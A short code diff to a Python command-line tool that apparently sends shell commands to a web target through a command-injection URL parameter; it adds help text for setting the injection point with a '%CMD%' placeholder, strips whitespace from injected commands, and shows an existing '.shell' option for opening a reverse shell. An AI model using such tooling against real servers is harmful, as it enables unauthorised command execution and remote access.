@@ -116,6 +116,9 @@ def show_help(cmd=None):
     sys.stdout.write(".referer <string> - set the value for HTTP referer\n")
   elif cmd == "shell":
     sys.stdout.write(".shell <ip_address> <port> - initiate reverse shell to target\n")
+  elif cmd == "url":
+    sys.stdout.write(".url <string> - set the target URL to string. Use '%CMD%' to specify where command injection goes.\n")
+    sys.stdout.write("                if %CMD% is not set, 'cmd' param will automatically be appended.\n")
   elif cmd == "useragent":
     sys.stdout.write(".useragent - show the User-Agent string\n")
     sys.stdout.write(".useragent <string> - set the value for User-Agent\n")
@@ -399,7 +402,7 @@ while True:
       cmd = re.sub('&', '%26', input)
       cmd = cmd.replace("\\", "\\\\")
     if '%CMD%' in url:
-      query = re.sub('%CMD%', cmd, url)
+      query = re.sub('%CMD%', cmd.strip(), url)
     else:
       if '?' in url:
         if 'cmd=' not in url:
